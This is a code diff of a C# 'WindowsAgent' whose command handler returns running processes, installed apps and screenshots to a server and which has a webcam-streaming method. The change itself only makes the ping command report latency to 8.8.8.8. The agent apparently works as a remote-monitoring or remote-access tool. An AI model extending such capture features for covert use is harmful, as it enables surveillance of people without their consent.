@@ -1,18 +1,14 @@
 using System;
 using System.Diagnostics;
-using System.Drawing;
 using System.Drawing.Imaging;
-using System.IO;
 using System.Text;
-using System.Windows.Forms;
 using Microsoft.Win32;
-using System.Threading.Tasks;
-using System.Linq;
-using System.Collections.Generic;
 using FlashCap;
 using SharpAvi;
 using SharpAvi.Output;
-using SharpAvi.Codecs;
+using System.Net.NetworkInformation;
+using System.Net;
+using System.Net.Sockets;
 
 namespace WindowsAgent
 {
@@ -64,7 +60,7 @@ namespace WindowsAgent
                 switch (cmd)
                 {
                     case "REGISTERED_OK": return ""; 
-                    case "CMD_PING": return "PONG: " + DateTime.Now.ToString("HH:mm:ss");
+                    case "CMD_PING": return "PING: " + GetPingString("8.8.8.8");
                     case "CMD_GET_PROCESS": return "LIST_PROC:" + GetRunningProcesses();
                     case "CMD_GET_APPS": return "LIST_APP:" + GetInstalledAppsWithPaths();
                     case "CMD_SCREENSHOT": return "IMG_BASE64:" + TakeScreenshot();
@@ -86,6 +82,33 @@ namespace WindowsAgent
                 }
             }
             catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        public string GetPingString(string hostAddress)
+        {
+            using (Ping pingSender = new Ping())
+            {
+                try
+                {
+                    // Send ping with a short timeout (e.g., 1000ms)
+                    PingReply reply = pingSender.Send(hostAddress, 1000);
+
+                    if (reply.Status == IPStatus.Success)
+                    {
+                        // Return just the number, or format it like "15 ms"
+                        return reply.RoundtripTime.ToString() + " ms"; 
+                    }
+                    else
+                    {
+                        // Return the error status (e.g., "TimedOut", "DestinationHostUnreachable")
+                        return reply.Status.ToString();
+                    }
+                }
+                catch (Exception)
+                {
+                    return "Error";
+                }
+            }
         }
 
         private void StartWebcamStream()
